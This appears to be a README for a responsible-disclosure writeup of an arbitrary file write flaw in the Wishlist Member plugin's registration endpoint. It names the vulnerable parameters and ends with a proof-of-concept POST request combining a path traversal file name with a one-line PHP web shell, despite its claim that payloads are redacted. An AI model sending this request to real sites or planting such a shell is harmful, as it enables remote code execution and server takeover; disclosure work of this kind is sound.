# Arbitrary File Write Vulnerability in Wishlist Member Plugin

## 📄 Overview

This repository contains a detailed analysis of an **Arbitrary File Write** vulnerability discovered in the **Wishlist Member** plugin. The vulnerability exists in the user registration interface and allows an attacker to write arbitrary files to the server by manipulating two specific POST parameters.

Although this report is for educational and responsible disclosure purposes, sensitive details have been omitted to prevent exploitation.

---

## ⚙ Vulnerability Details

- **Type**: Arbitrary File Write  
- **Affected Component**: User registration endpoint in Wishlist Member plugin  
- **Impact**: High – may lead to Remote Code Execution (RCE) if the file is moved to the web root and executed.

### How it works

By sending a crafted `POST` request with two parameters – `transient_hash` and `orig_email` – an attacker can specify both the location and content of a file. This can allow arbitrary code injection if the server is misconfigured or the file is executed.

---

## 🧰 Proof of Concept (POC)

> ⚠ Sensitive paths and payloads have been redacted for security reasons.

```http
POST /path/to/register HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

transient_hash=../path/to/file.php&orig_email=<?php system($_GET['cmd']); ?>
